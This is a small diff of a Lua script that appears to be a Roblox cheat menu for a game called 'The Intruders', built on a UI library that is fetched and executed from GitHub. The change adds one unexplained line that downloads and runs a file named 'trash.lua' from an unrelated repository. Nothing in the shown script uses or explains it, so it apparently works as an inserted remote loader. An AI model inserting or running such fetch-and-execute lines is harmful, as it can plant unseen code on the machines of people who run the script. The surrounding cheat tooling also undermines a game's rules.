@@ -1,7 +1,7 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "The Intruders", HidePremium = false, SaveConfig = true, IntroEnabled = false, ConfigFolder = "OrionTest"})
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lifaiossama/errors/main/trash.lua"))()
 
 if not game:IsLoaded() then
     game.Loaded:Wait()
